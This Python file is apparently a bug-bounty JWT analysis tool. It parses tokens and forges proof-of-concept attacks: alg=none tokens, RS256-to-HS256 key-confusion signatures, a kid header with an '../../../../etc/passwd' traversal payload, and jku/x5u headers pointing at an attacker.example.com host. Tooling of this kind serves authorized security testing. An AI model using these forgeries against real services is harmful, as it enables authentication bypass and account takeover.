#!/usr/bin/env python3
"""
jwt_analyzer.py — deep JWT weakness analysis
============================================

Tier 4 verifier.

Purpose
-------
A raw token in a JS bundle or a captured session is only as strong as its
configuration. This tool statically parses JWTs and forges the classic
attack-proof-of-concept tokens so a tester can confirm (not just suspect) each
weakness:

  - alg=none           — strip signature verification entirely
  - RS256→HS256        — sign an HS256 token with the *public* key (server may
                        treat the pub key as the HMAC secret)
  - kid injection      — inject a path/SQL payload into the protected-header `kid`
  - jku / x5u          — point the key-resolution fields at an attacker URL

All forging is pure-stdlib (hmac/base64url) — no external crypto needed, so it
stays Termux-native. Forging a token is NOT exploitation by itself; it produces
a candidate to replay against the target's auth endpoint.

Chain position
--------------
Layer 4 — Input: a JWT string (--token) or a JSON of tokens (--input, e.g.
           jsreaper/secret_verify output). Output: jwt-findings.json + forged
           tokens printed for manual replay.

Usage
-----
    python -m toolkit.verify.jwt_analyzer --token eyJ...
    python -m toolkit.verify.jwt_analyzer --input tokens.json --pubkey pub.pem

Author : Bug Bounty Toolkit / Tier 4
License : MIT (for authorized use only)
"""

from __future__ import annotations

import argparse
import base64
import datetime
import hashlib
import hmac
import json
import logging
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any


log = logging.getLogger("jwt_analyzer")


# ── JWT primitives (stdlib only) ─────────────────────────────────────────────

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def parse_jwt(token: str) -> tuple[dict[str, Any], dict[str, Any], str]:
    """Split a JWT into (header, payload, signature_b64url). Raises ValueError
    on malformed input."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(f"JWT must have 3 segments, got {len(parts)}")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload, parts[2]


def _sign_hs256(header_b64: str, payload_b64: str, secret: bytes) -> str:
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    digest = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return _b64url_encode(digest)


def forge_alg_none(payload: dict[str, Any]) -> str:
    """Forge an alg=none token (no signature)."""
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def forge_rs256_as_hs256(payload: dict[str, Any], public_key_pem: bytes) -> str:
    """RS256→HS256 confusion: sign HS256 using the public key bytes as the HMAC
    secret. Works when the verifying library keys off `alg` and ignores that
    the key is asymmetric."""
    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig = _sign_hs256(h, p, public_key_pem)
    return f"{h}.{p}.{sig}"


def forge_header_injection(
    payload: dict[str, Any],
    *,
    kid: str | None = None,
    jku: str | None = None,
    x5u: str | None = None,
    alg: str = "HS256",
) -> str:
    """Forge a token whose protected header carries a malicious `kid` / `jku` /
    `x5u` value. Unsigned (placeholder signature) — it demonstrates the
    injection point; a real exploit would also supply the matching key material."""
    header: dict[str, Any] = {"alg": alg, "typ": "JWT"}
    if kid is not None:
        header["kid"] = kid
    if jku is not None:
        header["jku"] = jku
    if x5u is not None:
        header["x5u"] = x5u
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.INJECTED"


# ── Analysis ─────────────────────────────────────────────────────────────────

@dataclass
class JwtAnalysis:
    token: str
    header: dict[str, Any]
    payload: dict[str, Any]
    issues: list[str]                  # human-readable weakness labels
    forgeries: dict[str, str] = field(default_factory=dict)  # name -> token


def analyze_token(token: str, public_key_pem: bytes | None = None) -> JwtAnalysis:
    """Parse a token, enumerate weaknesses, and (where possible) forge PoC
    tokens. The `alg=none` and header-injection forgeries are always produced;
    the RS256→HS256 forgery is produced only when a public key is supplied."""
    header, payload, _sig = parse_jwt(token)
    issues: list[str] = []

    alg = header.get("alg")
    if alg == "none":
        issues.append("alg=none: token asserts no signature — server may skip verification")
    elif alg in ("HS256", "HS384", "HS512") and "kid" in header:
        issues.append("HS* with kid: symmetric key + key-id → possible key confusion / path traversal")
    elif alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512"):
        if public_key_pem:
            issues.append("asymmetric alg + public key available → RS256→HS256 confusion possible")
        else:
            issues.append(f"asymmetric alg {alg}: obtain the public key to test RS256→HS256 confusion")

    if "kid" in header:
        issues.append("kid present: injection surface for SQL/path traversal in key lookup")
    if "jku" in header:
        issues.append("jku present: attacker-controlled JWKS URL — key injection surface")
    if "x5u" in header:
        issues.append("x5u present: attacker-controlled cert URL — key injection surface")

    # Forge PoCs
    forgeries: dict[str, str] = {}
    forgeries["alg_none"] = forge_alg_none(payload)
    if "kid" in header:
        forgeries["kid_injection"] = forge_header_injection(
            payload, kid=header["kid"] + "../../../../etc/passwd")
    if "jku" in header:
        forgeries["jku_injection"] = forge_header_injection(
            payload, jku="https://attacker.example.com/jwks.json")
    if "x5u" in header:
        forgeries["x5u_injection"] = forge_header_injection(
            payload, x5u="https://attacker.example.com/cert.pem")
    if public_key_pem and alg in ("RS256", "RS384", "RS512"):
        forgeries["rs256_as_hs256"] = forge_rs256_as_hs256(payload, public_key_pem)

    return JwtAnalysis(token=token, header=header, payload=payload,
                       issues=issues, forgeries=forgeries)


# ── Normalization ────────────────────────────────────────────────────────────

def to_normalized(analyses: list[JwtAnalysis], source_tool: str = "jwt_analyzer.py") -> list[dict[str, Any]]:
    from urllib.parse import urlparse
    from toolkit.infra.finding import compute_finding_id

    out: list[dict[str, Any]] = []
    for a in analyses:
        for issue in a.issues:
            host = urlparse(a.header.get("iss", "") or "").hostname or ""
            cls = "JWT_" + issue.split(":")[0].replace(" ", "_").upper()[:40]
            fid = compute_finding_id(source_tool, host, cls, a.token[:48])
            out.append({
                "id": fid,
                "source_tool": source_tool,
                "host": host,
                "url": "",
                "vuln_class_key": cls,
                "severity": "HIGH" if ("none" in issue or "confusion" in issue) else "MEDIUM",
                "title": f"JWT weakness: {issue.split(':')[0]}",
                "detail": issue,
                "evidence": a.token[:120],
                "raw": {"header": a.header, "forgeries": a.forgeries},
                "confidence": "candidate",
                "disposition": "new",
                "verified_by": None,
            })
    return out


def _collect_tokens(input_data: Any) -> list[str]:
    tokens: list[str] = []
    if isinstance(input_data, dict):
        for key in ("tokens", "jwts", "findings"):
            val = input_data.get(key)
            if isinstance(val, list):
                for item in val:
                    if isinstance(item, str) and item.count(".") == 2:
                        tokens.append(item)
                    elif isinstance(item, dict):
                        t = item.get("token") or item.get("value") or item.get("evidence")
                        if isinstance(t, str) and t.count(".") == 2:
                            tokens.append(t)
    elif isinstance(input_data, list):
        for item in input_data:
            if isinstance(item, str) and item.count(".") == 2:
                tokens.append(item)
            elif isinstance(item, dict):
                t = item.get("token") or item.get("value") or item.get("evidence")
                if isinstance(t, str) and t.count(".") == 2:
                    tokens.append(t)
    return tokens


def main() -> int:
    ap = argparse.ArgumentParser(prog="jwt_analyzer.py",
                                 description="Deep JWT weakness analysis + PoC forging.")
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--token", help="a single JWT to analyze")
    src.add_argument("--input", "-i", help="JSON file containing JWT(s)")
    ap.add_argument("--pubkey", help="PEM public key (for RS256→HS256 confusion)")
    ap.add_argument("--output", "-o", default="jwt-findings.json")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO,
                        format="[%(levelname)s] %(message)s")

    tokens: list[str] = []
    if args.token:
        tokens = [args.token]
    else:
        data = json.loads(Path(args.input).read_text(encoding="utf-8"))
        tokens = _collect_tokens(data)

    pubkey: bytes | None = None
    if args.pubkey:
        pubkey = Path(args.pubkey).read_bytes()

    analyses: list[JwtAnalysis] = []
    for t in tokens:
        try:
            a = analyze_token(t, pubkey)
        except ValueError as exc:
            log.warning("skipping unparsable token: %s", exc)
            continue
        analyses.append(a)
        log.info("token: alg=%s issues=%d forgeries=%d",
                 a.header.get("alg"), len(a.issues), len(a.forgeries))
        for name, forged in a.forgeries.items():
            log.info("  forged[%s] = %s...", name, forged[:40])

    findings = to_normalized(analyses)
    out_path = Path(args.output)
    out_path.write_text(json.dumps({
        "scan_time": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
        "tokens_analyzed": len(analyses),
        "findings": findings,
        "forgeries": {i: a.forgeries for i, a in enumerate(analyses)},
    }, indent=2, default=str), encoding="utf-8")
    log.info("wrote %s (%d findings)", out_path, len(findings))
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
